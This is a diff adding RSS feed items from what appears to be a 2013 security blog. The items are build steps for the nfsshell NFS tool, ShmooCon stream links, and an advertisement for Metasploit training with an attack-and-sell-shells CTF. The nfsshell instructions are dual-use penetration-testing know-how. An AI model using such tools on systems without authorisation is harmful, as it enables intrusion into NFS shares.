+      <description>&lt;p&gt;This is here because I always forget how to do it&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;sudo apt-get install libtirpc-dev libncurses-dev&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;wget &lt;a href=&#34;http://www.cs.vu.nl/pub/leendert/nfsshell.tar.gz&#34;&gt;http://www.cs.vu.nl/pub/leendert/nfsshell.tar.gz&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;tar zxvf nfsshell.tar.gz&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;cd nfs&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;ln -s /usr/include/tirpc/rpc/clnt_soc.h /usr/include/rpc/clnt_soc.h&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;perl -p -i.orig -e &amp;rsquo;s/getline/getline_nfs/&amp;rsquo; nfs.c&lt;/p&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Next part I don&amp;rsquo;t have a good way to automate. You need to go in and comment out (w/ #) the 4 lines following &amp;ldquo;uncomment the following 4 lines for Solaris 2.x&amp;rdquo; and uncomment the 2 lines following &amp;ldquo;For GNU readline support you need to add&amp;rdquo;&lt;/p&gt;
+
+&lt;p&gt;After that a simple &amp;ldquo;make&amp;rdquo; should get you ./nfs sitting there for your use.&lt;/p&gt;
+
+&lt;p&gt;Will probably make a repo out of this so I don&amp;rsquo;t have to keep doing it..&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>ShmooCon 2013 Streaming</title>
+      <link>http://localhost:1313/post/2013/2013/2/14/shmoocon-2013-streaming/</link>
+      <pubDate>Fri, 15 Feb 2013 04:11:29 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2013/2013/2/14/shmoocon-2013-streaming/</guid>
+      <description>&lt;p&gt;Thanks to &lt;a href=&#34;https://twitter.com/spatial_d&#34;&gt;@spatial_d&lt;/a&gt; for the tweet here: &lt;a href=&#34;https://twitter.com/spatial_d/status/302253050725298176&#34;&gt;https://twitter.com/spatial_d/status/302253050725298176&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;I&amp;rsquo;m capturing it here more of a bookmark for myself:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Build It: &lt;a href=&#34;http://www.ustream.tv/channel/build-it-2013&#34;&gt;http://www.ustream.tv/channel/build-it-2013&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Belay It: &lt;a href=&#34;http://www.ustream.tv/channel/belay-it-2013&#34;&gt;http://www.ustream.tv/channel/belay-it-2013&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Bring It On: &lt;a href=&#34;http://www.ustream.tv/channel/bring-it-2013&#34;&gt;http://www.ustream.tv/channel/bring-it-2013&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Metasploit Mastery meets CanSecWest</title>
+      <link>http://localhost:1313/post/2013/2013/1/25/metasploit-mastery-meets-cansecwest/</link>
+      <pubDate>Fri, 25 Jan 2013 16:12:20 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2013/2013/1/25/metasploit-mastery-meets-cansecwest/</guid>
+      <description>&lt;p&gt;In 2012 @&lt;a href=&#34;https://twitter.com/egyp7&#34;&gt;egypt&lt;/a&gt;and I taught &lt;a href=&#34;https://www.derbycon.com/traning-classes-2012/#metasploit&#34;&gt;Metasploit Mastery&lt;/a&gt; for a day and a half @&lt;a href=&#34;https://twitter.com/derbycon&#34;&gt;DerbyCon&lt;/a&gt; . This was a lot of fun but we had to cram a TON of slides into that short period of time. PLUS we had a CTF at the end where people had to break into a corporate network (virtualized) and sell their shells, data, passwords, or flags to us (egypt and I were acting as opposing countries). You could sell low to one and high to another whatever. Most money at the end wins. (We used a score card with ranges to keep it even)&lt;/p&gt;
+
+&lt;p&gt;We are doubling down on the content being provided and doing a 3 full days @ &lt;a href=&#34;https://twitter.com/secwest&#34;&gt;CanSecWest&lt;/a&gt;. You get to learn the nooks and cranies of Metasploit&amp;rsquo;s guts from &lt;em&gt;the&lt;/em&gt; egypt himself, and operational use from me, with a ton mixed in between. I mean, just getting in the room with egypt&amp;rsquo;s beard is worth the price of admission.&lt;/p&gt;
+
+&lt;p&gt;See you there!&lt;/p&gt;
+
+&lt;p&gt;Link: &lt;a href=&#34;http://cansecwest.com/dojos/2013/meta_mastery.html&#34;&gt;http://cansecwest.com/dojos/2013/meta_mastery.html&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
